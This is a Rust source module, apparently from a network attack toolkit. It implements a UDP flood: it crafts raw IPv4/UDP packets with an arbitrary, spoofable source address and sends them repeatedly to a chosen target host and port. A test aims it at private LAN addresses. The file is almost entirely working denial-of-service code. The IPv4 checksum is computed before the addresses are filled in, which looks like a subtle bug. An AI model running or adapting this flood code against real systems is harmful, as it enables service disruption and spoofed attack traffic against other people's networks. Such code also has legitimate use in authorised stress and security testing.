use anyhow::Result;
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::ipv4;
use pnet::packet::ipv4::Ipv4Flags;
use pnet::packet::ipv4::MutableIpv4Packet;
use pnet::packet::udp::{ipv4_checksum, MutableUdpPacket};
use rand::Rng;
use std::net::Ipv4Addr;

use crate::layers::layer3_ipv4_send;
use crate::layers::{IPV4_HEADER_SIZE, UDP_HEADER_SIZE};

const UDP_DATA_SIZE: usize = 0;
const TTL: u8 = 64;

pub fn send_udp_flood_packet(
    src_ipv4: Ipv4Addr,
    src_port: u16,
    dst_ipv4: Ipv4Addr,
    dst_port: u16,
    max_same_packet: usize,
) -> Result<()> {
    let mut rng = rand::thread_rng();
    // ip header
    let mut ip_buff = [0u8; IPV4_HEADER_SIZE + UDP_HEADER_SIZE + UDP_DATA_SIZE];
    let mut ip_header = MutableIpv4Packet::new(&mut ip_buff).unwrap();
    ip_header.set_version(4);
    ip_header.set_header_length(5);
    ip_header.set_total_length((IPV4_HEADER_SIZE + UDP_HEADER_SIZE + UDP_DATA_SIZE) as u16);
    let id = rng.gen();
    ip_header.set_identification(id);
    ip_header.set_flags(Ipv4Flags::DontFragment);
    ip_header.set_ttl(TTL);
    ip_header.set_next_level_protocol(IpNextHeaderProtocols::Udp);
    let c = ipv4::checksum(&ip_header.to_immutable());
    ip_header.set_checksum(c);
    ip_header.set_source(src_ipv4);
    ip_header.set_destination(dst_ipv4);

    // udp header
    let mut udp_header = MutableUdpPacket::new(&mut ip_buff[IPV4_HEADER_SIZE..]).unwrap();
    udp_header.set_source(src_port);
    udp_header.set_destination(dst_port);
    udp_header.set_length((UDP_HEADER_SIZE + UDP_DATA_SIZE) as u16);
    // udp_header.set_payload(&vec![b'a'; 10]); // test
    let checksum = ipv4_checksum(&udp_header.to_immutable(), &src_ipv4, &dst_ipv4);
    udp_header.set_checksum(checksum);

    for _ in 0..max_same_packet {
        let _ret = layer3_ipv4_send(src_ipv4, dst_ipv4, &ip_buff, vec![], 0)?;
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn test_udp_flood_packet() {
        let src_ipv4 = Ipv4Addr::new(192, 168, 72, 128);
        let dst_ipv4 = Ipv4Addr::new(192, 168, 72, 135);
        let src_port = 57831;
        let dst_port = 80;
        let ret = send_udp_flood_packet(src_ipv4, src_port, dst_ipv4, dst_port, 3).unwrap();
        println!("{:?}", ret);
    }
}
